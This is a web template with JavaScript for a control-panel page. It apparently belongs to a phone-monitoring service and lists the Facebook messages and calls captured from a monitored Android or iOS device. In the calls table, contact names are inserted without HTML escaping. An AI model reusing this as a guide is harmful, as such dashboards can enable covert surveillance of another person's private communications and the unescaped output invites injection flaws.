<div class="row form-inline">
    <div class="col-lg-6 col-md-6 col-sm-6">
        <label for="account">{$di.t->_('Account')} </label>
        {include "scripts/select.htm" name="account" id="account" class="form-control" keys=$accounts values=$accounts}
    </div>
    <div class="col-lg-6 col-md-6 col-sm-6">
        <div class="daterangepickerWrapper">
            <div id="reportrange" class="btn btn-default pull-right">
                <i class="fa fa-calendar fa-lg"></i>
                <span></span>
                <b class="caret"></b>
            </div>
        </div>
    </div>
</div>


<ul class="nav nav-pills">
    <li><a href="#messages" data-toggle="tab">{$di.t->_('Messages')}</a></li>
    <li><a href="#calls" data-toggle="tab">{$di.t->_('Calls')}</a></li>
</ul>


<div class="tab-content">
    <div class="tab-pane" id="messages">
        <div class="table-container dialogs-table">
            <table class="dataTable" id="messages-datatable" aria-describedby="datatables_info">
                <thead>
                    <tr role="row">
                        <th>{$di.t->_('Name')}</th>
                        <th>{$di.t->_('Last Message')}</th>
                        <th>{$di.t->_('Date')}</th>
                    </tr>
                </thead>
            </table>
        </div>
    </div>
    <div class="tab-pane" id="calls">
        <div class="table-container">
            <table id="calls-datatable" aria-describedby="datatables_info">
                <thead>
                    <tr role="row">
                        <th>{$di.t->_('Name')}</th>
                        <th>{$di.t->_('Type')}</th>
                        <th>{if $di.currentDevice.os === 'android'}{$di.t->_('Call Type')}{elseif $di.currentDevice.os === 'ios'}{$di.t->_('Duration')}{/if}</th>
                        <th>{$di.t->_('Date')}</th>
                    </tr>
                </thead>
            </table>
        </div>
    </div>
</div>

<script type="text/javascript">
        function customOffsetMoment(input, format, locale, strict) {
            var m = moment(input, format, locale, strict);
            {if isset($customTimezoneOffset)}
                m.zone({$customTimezoneOffset});
            {/if}
            return m;
        }

        $(document).ready(function() {
            var typeTmpl = _.template('<i class="call-<%= type %> hidden-xs" title="<%= title %>"></i><span class="visible-xs"><%= title %></span>');

            var facebook = {
                startDate: -1,
                endDate: -1,
                currentTab: '',
                messagesTable: null,
                callsTable: null,
                userName: _.template('<a href="http://facebook.com/<%= id %>" class="disable-on-demo" target="_blank"><%- name %></a>'),
                getRangeUrl: function(start, end) {
                    if (start === null && end === null) {
                        this.startDate = this.endDate = -1;
                    } else if (start && end) {
                        this.startDate = moment(start).unix();
                        this.endDate = moment(end).unix();
                    }

                    var url = '';
                    if (this.currentTab === 'messages') {
                        url = '{$di.config.domain}/cp/facebook/messages?';
                    } else if (this.currentTab === 'calls') {
                        url = '{$di.config.domain}/cp/facebook/calls?';
                    }

                    return url + $.param({
                        account: $('#account').val(),
                        timeFrom: this.startDate,
                        timeTo: this.endDate
                    });
                },
                initMessages: function() {
                    var messagesTable = $('#messages-datatable').dataTable({
                        bProcessing: true,
                        bServerSide: true,
                        sAjaxSource: this.getRangeUrl(),
                        bPaginate: true,
                        bFilter: false,
                        bSort: true,
                        bInfo: true,
                        bAutoWidth: false,
                        bSortMulti: false,
                        iDisplayLength: {$authData.records_per_page},
                        aaSorting: [[2, 'desc']],
                        oLanguage: {
                            sUrl: '{$di.config.staticDomain}/datatables/language/{$di.t->getLocale()}.txt'
                        },
                        aoColumns: [{
                                mData: "name",
                                bUseRendered: false,
                                fnRender: function(obj) {
                                    if (obj.aData.members > 1) {
                                        return '<b>Group</b>';
                                    } else {
                                        return facebook.userName({
                                            id: obj.aData.id,
                                            name: obj.aData.name
                                        });
                                    }
                                }
                            },
                            {
                                mData: "text",
                                fnRender: function(obj, value) {
                                    if (_.isString(value)) {
                                        if (value.length > 200) {
                                            return value.substr(0, 200) + '...';
                                        }

                                        return _.escape(value);
                                    }
                                    return '';
                                }
                            },
                            {
                                mData: null,
                                sWidth: '180px',
                                fnRender: function(obj) {
                                    return customOffsetMoment(obj.aData.timestamp * 1000).format('lll');
                                }
                            }],
                        fnRowCallback: function(nRow, data) {
                            $(nRow).on('click', function() {
                                if (data.group !== null) {
                                    window.location = '{$di.router->getRouteUrl("facebook")}/' + encodeURIComponent($('#account').val()) + '/group/' + encodeURIComponent(data.group);
                                } else {
                                    window.location = '{$di.router->getRouteUrl("facebook")}/' + encodeURIComponent($('#account').val()) + '/private/' + encodeURIComponent(data.id);
                                }
                            });
                        },
                        fnDrawCallback: function() {
                            facebook.messagesTable = messagesTable;
                            $(this).find('tbody').tableScroll();
                        }
                    });
                },
                initCalls: function() {
                    var callsTable = $('#calls-datatable').dataTable({
                        bProcessing: true,
                        bServerSide: true,
                        sAjaxSource: this.getRangeUrl(),
                        bPaginate: true,
                        bFilter: true,
                        bSort: true,
                        bInfo: true,
                        bAutoWidth: false,
                        bSortMulti: false,
                        iDisplayLength: {$authData.records_per_page},
                        aaSorting: [[3, 'desc']],
                        oLanguage: {
                            sUrl: '{$di.config.staticDomain}/datatables/language/{$di.t->getLocale()}.txt'
                        },
                        aoColumns: [{
                                mData: "name",
                                bUseRendered: false,
                                fnRender: function(obj) {
                                    if (obj.aData.members > 1) {
                                        return '<b>{$di.t->_('Group')}</b>';
                                    } else {
                                        return obj.aData.name;
                                    }
                                }
                            },
                            {
                                mData: "type",
                                bUseRendered: false,
                                sWidth: '80px',
                                fnRender: function(obj, value) {
                                    if (value === 'in') {
                                        return typeTmpl({
                                            type: 'in',
                                            title: "{$di.t->_('Incoming call')}"
                                        });
                                    } else if (value === 'out') {
                                        return typeTmpl({
                                            type: 'out',
                                            title: "{$di.t->_('Outgoing call')}"
                                        });
                                    } else {
                                        return '*';
                                    }
                                }
                            },
                            {if $di.currentDevice.os === 'android'}
                            {
                                mData: "call_type",
                                bUseRendered: false,
                                sWidth: '110px',
                                fnRender: function(obj, value) {
                                    if (value == 'regular') {
                                        return "{$di.t->_('Regular')}";
                                    } else if (value == 'video') {
                                        return "{$di.t->_('Video')}";
                                    }
                                }
                            },
                            {elseif $di.currentDevice.os === 'ios'}
                            {
                                mData: "duration",
                                bUseRendered: false,
                                sWidth: '110px',
                                fnRender: function(obj, value) {
                                    return moment.utc(value * 1000).format("HH:mm:ss");
                                }
                            },
                            {/if}
                            {
                                mData: "timestamp",
                                bUseRendered: false,
                                sWidth: '180px',
                                fnRender: function(obj) {
                                    return customOffsetMoment(obj.aData.timestamp * 1000).format('lll');
                                }
                            }],
                        fnDrawCallback: function() {
                            facebook.callsTable = callsTable;
                            $(this).find('tbody').tableScroll();
                        }
                    });
                },
                setTab: function(hash) {
                    this.currentTab = hash.split('#')[1];

                    if (this.currentTab === 'messages') {
                        if (this.messagesTable === null) {
                            this.initMessages();
                        }
                    } else if (this.currentTab === 'calls') {
                        if (this.callsTable === null) {
                            this.initCalls();
                        }
                    }

                    this.reloadTable(this.getRangeUrl());
                },
                reloadTable: function(url) {
                    if (this.currentTab === 'messages') {
                        if (this.messagesTable !== null) {
                            this.messagesTable.fnReloadAjax(url);
                        }
                    } else if (this.currentTab === 'calls') {
                        if (this.callsTable !== null) {
                            this.callsTable.fnReloadAjax(url);
                        }
                    }
                }
            };

            $('#account').change(function() {
                facebook.reloadTable(facebook.getRangeUrl());
            });

            $('.nav-pills a').on('show.bs.tab', function(e) {
                window.location.hash = e.target.hash;
                window.scrollTo(0, 0);

                facebook.setTab(e.target.hash);
            });

            var url = document.location.toString();
            if (url.match('#')) {
                $('.nav-pills a[href=#' + url.split('#')[1] + ']').tab('show');
            } else {
                $('.nav-pills a[href=#messages]').tab('show');
            }

            $('#reportrange').timeRange(function(from, to) {
                facebook.reloadTable(facebook.getRangeUrl(from, to));
            });
        });
    </script>